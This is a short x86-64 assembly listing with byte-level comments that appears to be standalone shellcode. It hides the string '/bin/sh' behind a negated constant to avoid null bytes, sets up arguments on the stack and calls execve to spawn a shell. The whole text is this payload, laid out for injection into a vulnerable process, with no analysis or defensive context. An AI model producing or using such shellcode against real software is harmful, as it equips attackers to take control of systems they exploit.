BITS 64
section .text
global _start

_start:
    xor eax, eax ; 31 c0 
    movabs rbx, 0xff978cd091969dd1 ; 48 bb d1 9d 96 91 d0 8c 97 ff 
    neg rbx ; 48 f7 db 
    push rbx ; 53 
    push rsp ; 54 
    pop rdi ; 5f 
    cdq  ; 99 
    push rdx ; 52 
    push rdi ; 57 
    push rsp ; 54 
    pop rsi ; 5e 
    mov al, 0x3b ; b0 3b 
    syscall  ; 0f 05 
